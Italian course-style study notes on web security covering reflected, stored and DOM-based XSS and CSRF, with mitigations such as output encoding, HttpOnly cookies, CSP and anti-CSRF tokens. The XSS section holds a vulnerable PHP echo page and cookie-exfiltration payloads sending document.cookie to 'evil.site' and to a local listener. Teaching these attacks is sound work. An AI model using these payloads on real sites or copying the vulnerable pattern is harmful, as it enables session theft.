## Cross-Site Scripting (XSS)
Un attaccante inserisce codice malevolo all'interno di pagine web, esso può:
- Eseguire il **leak** di informazioni sensibili (bypassa [[Web security#Same Origin Policy|SOP]])
- **Controllare** l'applicazione
- **Dirottare** la sessione

Il codice inserito è eseguito nel browser nel **contesto** della pagina web corrente.
Il codice malevolo può accedere a **qualsiasi informazione** (compresi i cookie) della pagina web.
![[XSS.png]]

Esistono tre tipi di vulnerabilità XSS:
1. **Reflected**
2. **Stored**
3. **DOM-based**

### Reflected XSS
**Assunzione**: la pagina web incorpora l'input mandato al server come parte della richiesta (l'input potrebbe contenere codice).

1. Una **pagina malevola** con un link all'applicazione vittima (o link inviato tramite mail, i.e. _phishing_)
2. L'utente **preme** il link
3. L'applicazione vittima incorpora lo **script inserito**
4. Lo script esegue il **leak** delle informazioni sensibili dell'utente

Immaginiamo di avere la seguente pagina:
```php
<html>
	<body>
		<?php
			 header("X-XSS-Protection: 0"); // disables XSS auditor
			 session_name("SESSID1");
			 session_start();
			 echo "Welcome, " . $_GET['name'] . $_GET['surname'];
		?>
	</body>
</html>
```

Un attaccante potrebbe inserire codice javascript arbitrario:
```html
https://.../greet.php?name=<script>alert("Hi there")</script>

<html>
	<body>
		Welcome, <script>alert("Hi there")</script>
	</body>
</html>
```

Lo script viene **riflesso** nella pagina e poi eseguito (mostrando un alert).

I **cookie** che non usano la flag `HttpOnly` sono accessibili da javascript:
```html
.../greet.php?name=<script>alert(document.cookie);</script>
```

I cookie possono anche essere rivelati attraverso **cross-origin** (SOP bypass):
```html
<!-- "%2b" è  l'url encoding di "+" -->
.../greet.php?name=<script>location.href='http://evil.site/steal.p
hp?cookie='%2bencodeURIComponent(document.cookie);</script>
```
>Link sospetti possono essere **offuscati** usando url shortner.

L'attacco appena visto reindirizza l'utente verso la pagina malevola e verrebbe notata, possiamo eseguire un attacco più **furtivo** eseguendo una richiesta `GET` in background.
```html
…/greet.php?name=r1x<script>var i=new Image;
i.src="http://localhost:8001/"%2Bdocument.cookie;</script>
```
>Come prima i cookie sono rivelati come parte dell'URL, in questo caso però l'immagine non esiste, l'errore non sarà visibile all'utente.

### Stored XSS
**Assunzione**: l'applicazione web **memorizza** l'input inviato al server e lo mostra come parte di una pagina web (e.g. post in un forum), anche in questo caso l'input potrebbe contenere codice.

Il codice malevolo è eseguito quando qualche utente visita le pagine **infette**.
1. L'attaccante **memorizza** uno script malevolo nell'applicazione vittima
2. L'utente visita la pagina della vittima ed **esegue** lo script
3. Lo script viene eseguito nel contesto dell'applicazione vittima ed esegue il **leak** dei dati sensibili dell'utente.

### DOM-based XSS
Simile al _reflected XSS_ ma il payload dell'attacco non è aggiunto alla pagina da parte del server.

L'inserimento del codice malevolo avviene client-side grazie a degli script già esistenti.
>Lo script esistente include lo script "injected" all'interno della pagina.

1. Una **pagina malevola** con un link all'applicazione vittima (o link inviato tramite mail, i.e. _phishing_)
2. L'utente **preme** il link contenente parametri malevoli
3. L'applicazione vittima **ritorna una pagina non infetta**
4. Uno script già esistente processa i parametri e come side effect **incorpora il codice malevolo**

```html
<select><script>
	document.write(
		"<OPTION value=1>"
		+ decodeURI(document.location.href.substring(
		document.location.href.indexOf("default=")+8 ))
		+ "</OPTION>"
	);
	document.write("<OPTION value=2>English</OPTION>");
</script></select>
```

In questo esempio viene composta la prima opzione dinamicamente dal parametro `default` della richiesta `GET` nell'url.

Seguono esempi di una richiesta onesta ed una malevola:
```html
.../page.html?default=French
.../page.html?default=<script>alert(document.cookie)</script>
```

>[!Info]
>Questo semplice XSS è bloccato dall'**XSS auditor** nei browser che lo supportano.
>
>Tuttavia ultimamente è stato deprecato da alcuni browser in quanto non eliminava tutte le vulnerabilità ed inoltre bloccava il corretto funzionamento di alcuni siti leciti.

## XSS prevention and mitigation
**Output validation**:
- Eseguire l'**encoding** dei caratteri html
- Evitare punti di inserimento dei dati particolarmente pericolosi

**Input validation**: bisogna consentire solo ciò che ci si aspetta
- Lunghezza propria, un set di caratteri limitati che rispettano regole regex
- Usare delle **whitelist** quando possibile

Filtrare il tag `<script>` non è abbastanza in quanto javascript inline non utilizza tale tag:
```html
<body onload='alert("xss load")'>
<a onmouseover='alert("xss over")'>Free iPhone</a>
```

Per mitigare l'XSS è consigliabile impostare la flag `HttpOnly` nei cookie per non renderli leggibili da javascript.

Utilizzare la **Content Security Policy (CSP)** per specificare solo i **domini fidati**, inoltre gli script inline possono essere **disabilitati**.
>CSP deve essere configurato server side.

**XSS auditor**: il codice della pagina web che appare anche nella richiesta è bloccato (mitiga il _reflected_ XSS).

---
## Cross-Site Request Forgery (CSRF)
L'attaccante forgia **richieste malevole** per una web app nella quale l'utente corrente è **autenticato**.

Le richieste malevole sono **inoltrate** alla web app vulnerabile **attraverso il browser della vittima**.

I siti internet non possono sapere se la richiesta è stata generata intenzionalmente dall'utente o meno, il CSRF è un attacco all'**integrità** e non può essere bloccato da SOP.
![[CSRF.png]]

### Anti-CSRF token
Un **valore casuale** che è associato con la sessione dell'utente e rigenerato ad ogni richiesta.

Il token è nascosto in ogni form, quando il form è inviato il token viene confrontato con quello attuale, l'operazione è autorizzata solo se combaciano.
>Nella sua versione **stateless** può anche essere salvato in un cookie.

Processo di **verifica**:
1. L'utente invia il form che contiene il CSRF token
2. Il cookie che contiene una copia del token viene allegato
3. Il server controlla se combaciano

![[Anti-CSRF token.png]]

### Origin and Referer
L'header **Origin** è stato introdotto per prevenire il CSRF, esso contiene solo l'origine e non rivela informazioni sensibili (e.g. parametri di una richiesta GET).

Controlla che il valore corrisponda a quello delle origini previste.
>Origin non è presente in tutte le richieste (browser-dependent).

Quando Origin non è presente, è possibile controllare il **Referer**.
>Il Referer è **rimosso** in certi casi per prevenire il leak di dati.

Se entrambi mancano nella richiesta? Rifiutarla potrebbe far crashare l'applicazione.
>È necessario accoppiare il controllo standard dell'head con almeno un altro meccanismo anti-CSRF.

Segue un esempio con `Origin`:
![[Origin.png]]

### Custom headers
Per le richieste **AJAX** è sufficiente controllare la presenta dell'header `X-Requested-With` con valore `XMLHttpRequest`.

Solo un numero ristretto di header possono essere inviati nelle richieste cross origin, e `X-Requested-With` non è tra questi.
>Ciò non funziona per richieste che non sono AJAX.

Con la stessa origine l'header può essere impostato:
```js
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "https://secgroup.dais.unive.it");
xmlHttp.setRequestHeader('X-Requested-With','XMLHttpRequest');
xmlHttp.send(null);
```

Ma in cross-origin non può essere impostato:
```js
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "https://www.google.it");
xmlHttp.setRequestHeader('X-Requested-With','XMLHttpRequest');
xmlHttp.send(null);

// (index):1 Failed to load https://www.google.it/: ....
```

### User interaction
Per **operazioni critiche** (e.g. trasferimenti bancari) è solitamente una buona idea richiedere all'utente di <u>eseguire un'azione esplicita</u>, tra cui:
- **Ri-autenticarsi**
- **OTP** (One-Time Password)
- **Extra input** (e.g. CAPTCHA)

L'idea è che l'utente controlli due volte la richiesta ed inserisca un valore **non predicibile** per confermare.
**Se** il valore non può essere previsto dall'attaccante, **allora** la conferma non potrà essere soggetta ad un altro attacco CSRF.
